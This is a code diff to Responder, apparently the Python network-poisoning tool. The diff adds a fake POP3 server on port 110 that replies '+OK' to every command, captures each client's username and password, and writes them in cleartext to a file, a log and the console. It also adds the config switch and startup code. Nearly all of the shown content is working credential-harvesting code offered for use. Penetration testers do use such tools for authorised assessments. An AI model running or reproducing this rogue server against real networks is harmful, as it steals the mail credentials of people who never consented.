@@ -61,6 +61,7 @@ SSL_On_Off = config.get('Responder Core', 'HTTPS').upper()
 SMB_On_Off = config.get('Responder Core', 'SMB').upper()
 SQL_On_Off = config.get('Responder Core', 'SQL').upper()
 FTP_On_Off = config.get('Responder Core', 'FTP').upper()
+POP_On_Off = config.get('Responder Core', 'POP').upper()
 LDAP_On_Off = config.get('Responder Core', 'LDAP').upper()
 DNS_On_Off = config.get('Responder Core', 'DNS').upper()
 NumChal = config.get('Responder Core', 'Challenge')
@@ -160,7 +161,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS & LLMNR responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface:%s\nChallenge set is:%s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
+Show_Help("[+]NBT-NS & LLMNR responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface:%s\nChallenge set is:%s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nPOP3 Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,POP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
 
 #Simple NBNS Services.
 W_REDIRECT   = "\x41\x41\x00"
@@ -1517,6 +1518,45 @@ class LDAP(BaseRequestHandler):
            pass #No need to print timeout errors.
 
 ##################################################################################
+#POP3 Stuff
+##################################################################################
+class POPOKPacket(Packet):
+    fields = OrderedDict([
+        ("Code",           "+OK"),
+        ("CRLF",      "\r\n"),                    
+    ])
+
+#POP3 server class.
+class POP(BaseRequestHandler):
+
+    def handle(self):
+        try:
+          self.request.send(str(POPOKPacket()))
+          data = self.request.recv(1024)
+          if data[0:4] == "USER":
+             User = data[5:].replace("\r\n","")
+             logging.warning('[+]POP3 User: %s'%(User))
+             t = POPOKPacket()
+             self.request.send(str(t))
+             data = self.request.recv(1024)
+          if data[0:4] == "PASS":
+             Pass = data[5:].replace("\r\n","")
+             Outfile = os.path.join(ResponderPATH,"POP3-Clear-Text-Password-"+self.client_address[0]+".txt")
+             WriteData(Outfile,User+":"+Pass, User+":"+Pass)
+             print "[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass)
+             logging.warning("[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass))
+             t = POPOKPacket()
+             self.request.send(str(t))
+             data = self.request.recv(1024)
+          else :
+             t = POPOKPacket()
+             self.request.send(str(t))
+             data = self.request.recv(1024)
+        except Exception:
+           pass
+
+
+##################################################################################
 #Loading the servers
 ##################################################################################
 
@@ -1563,6 +1603,13 @@ def Is_FTP_On(FTP_On_Off):
     if FTP_On_Off == "ON":
        return thread.start_new(serve_thread_tcp,('', 21,FTP))
     if FTP_On_Off == "OFF":
+       return False
+
+#Function name self-explanatory
+def Is_POP_On(POP_On_Off):
+    if POP_On_Off == "ON":
+       return thread.start_new(serve_thread_tcp,('', 110,POP))
+    if POP_On_Off == "OFF":
        return False
 
 #Function name self-explanatory
@@ -1634,6 +1681,7 @@ def main():
       Is_SQL_On(SQL_On_Off)
       Is_LDAP_On(LDAP_On_Off)
       Is_DNS_On(DNS_On_Off)
+      Is_POP_On(POP_On_Off)
       #Browser listener loaded by default
       thread.start_new(serve_thread_udp,('', 138,Browser))
       ## Poisoner loaded by default, it's the purpose of this tool...
